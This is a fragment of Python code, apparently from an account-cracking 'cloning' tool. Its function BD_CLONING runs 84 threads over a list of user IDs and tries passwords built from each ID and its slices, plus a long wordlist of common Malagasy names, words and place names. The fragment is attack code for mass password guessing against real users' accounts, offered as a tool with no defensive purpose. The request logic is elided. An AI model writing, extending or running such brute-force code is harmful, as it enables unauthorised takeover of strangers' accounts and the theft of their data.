...
def BD_CLONING():
    ...
    with tred(max_workers=84) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'nekena','Nekena','fitiavana','Fitiavana','nirina','Nirina','fanantenana','Fanantenana','malala','Malala','amboara','badoda','Amboara','nomena','Nomena','vadiko','Vadiko','fiderana','Fiderana','fandresena','Fandresena','nantenaina','Nantenaina','Rakotomalala','rakotomalala','fahendrena','Fahendrena','finoana','Finoana','fanomezana','Fanomezana','faneva','Faneva','valisoa','Valisoa','malalako','Malalako','narovana','Narovana','narindra','Narindra','sarindra','Sarindra','mamako','Mamako','mamiko','Mamiko','tantely','Tantely','tolotra','Tolotra','diamondra','Diamondra','safidy','Safidy','mahefa','Mahefa','solofo','Solofo','randria','Randria','mahery','Mahery','tsilavina','Tsilavina','mamako','Mamako','malagasy','Malagasy','maminiaina','Maminiaina','fanomezantsoa','Fanomezantsoa','diamondra','Diamondra','mandresy','Mandresy','jesosy','Jesosy','Milely','milely','antananarivo','Antananarivo','sombiniaina','Sombiniaina']
